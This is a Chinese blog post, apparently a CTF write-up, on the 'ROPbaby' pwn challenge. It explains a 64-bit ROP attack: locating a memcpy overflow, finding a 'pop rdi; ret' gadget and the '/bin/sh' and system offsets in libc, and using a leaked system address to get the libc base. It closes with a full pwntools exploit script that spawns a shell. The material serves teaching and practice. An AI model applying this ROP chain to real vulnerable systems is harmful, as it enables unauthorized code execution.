---
layout:     post
title:      实验吧ROPbaby(PWN)
subtitle:   一道简单的ROP手法的PWN题
date:       2019-07-26
author:     LISTONE
header-img: img/post-bg-digital-native.jpg
catalog: true
tags:
    - linux
    - Notes
---
>本文首发于博主公众号LISTONE，欢迎关注哦！

题目链接：[ROPbaby](http://www.shiyanbar.com/ctf/2028)
（没想到题目服务器挂掉了，只能本地做了）

这个题目给了我们两个文件一个ROPbaby，一个libc。

首先查看ropbaby的文件信息和保护方式。

在这里可以看到程序开启了NX，这样的话shellcode的方式就很难用了，因此我们用ROP的方法来溢出攻击。

ROP的思路就是通过返回导向式编程，劫持程序的返回地址，将其定位到目标位置，在CTF中，我们一般都是劫持程序运行`system('/bin/sh')`。

这个程序通过上面的信息可以知道是64位的，在64位程序中，函数调用时，前六个参数是通过`rdi`、`rsi`、`rdx`、`rcx`、`r8`和`r9`来进行传递的，我们的目的是劫持程序执行`system('/bin/sh')`这个语句。

因此，我们需要做的就是：
1. 找到溢出点
2. 构造gadget，包含`pop rdi | retn`
3. 在libc中找到`/bin/sh`字符串的地址，并送入`rdi`寄存器
4. 找到`system`函数地址，并使程序跳转执行`system`函数

通过题目中给出的libc文件，我们可以轻易地在终端中使用如下命令找到`pop rdi | retn`的地址
```
ROPgadget --binary libc-2.23.so --only "pop|ret" |grep "pop rdi"
```
结果如下：  
![ROPgadget](http://wx2.sinaimg.cn/large/007cEDWily1g5dnsj933cj30gx02gmxx.jpg)

我们需要着重记住上面我框住的那个地址。

找溢出点：
在程序中有一个`memcpy`函数如下：  
![memcpy](http://wx2.sinaimg.cn/large/007cEDWily1g5dnslmgusj308301d745.jpg)

其中`savedergs`是以`int64`声明的，因此最多可输入8个字符，之后多输入就会溢出，这个地方就是我们要找的溢出点了。

然后在libc中找到`/bin/sh`的地址，用下面的命令就可以：
```
strings -tx libc-2.23.so|grep "/bin/sh"
```
![/bin/sh](http://wx2.sinaimg.cn/large/007cEDWily1g5dnsp9s5mj30am0193yj.jpg)

在这个程序中可以直接查找`system`函数的地址，但是我们需要找到程序的基址，所以我们需要找到`system`的偏移地址。
```
 objdump -T libc-2.23.so|grep "system"
```
![objdump](http://wx3.sinaimg.cn/large/007cEDWily1g5dnssdtqnj30jp02ddh1.jpg)
这里面0x45390就是`system`函数的地址

所以，我们可以写出利用脚本：

```
#!/usr/bin/env/python
# coding=utf-8  
from pwn import *  
#context.log_level = "debug"  
env = os.environ  
#p = remote('106.2.25.7','8004')  
p = process('./ropbaby')  
pop_rdi_ret_offset = 0x21102  
  
str_bin_sh_offset = 0x18cd17  

system_addr_offset = 0x45390  
  
p.recvuntil(':')  
p.sendline('2')  
p.recvuntil('Enter symbol: ')  
p.sendline('system')  
  
system_addr = int(p.recvline()[15:],16)  
print '[+]system_addr: '+ str(hex(system_addr))  

base_addr = system_addr - system_addr_offset  
  
str_bin_sh_addr = base_addr + str_bin_sh_offset  
print "[+]binsh: " + str(hex(str_bin_sh_addr))  
rdi_ret = base_addr + pop_rdi_ret_offset  
  
p.recvuntil(':')  
p.sendline('3')  
p.recvuntil('Enter bytes to send (max 1024): ')  
  
payload = 'a'*8 + p64(rdi_ret) + p64(str_bin_sh_addr) + p64(system_addr)  
  
# p.sendline(str(len(payload)))  
p.sendline('32')  
p.sendline(payload)  
  
p.interactive()  
```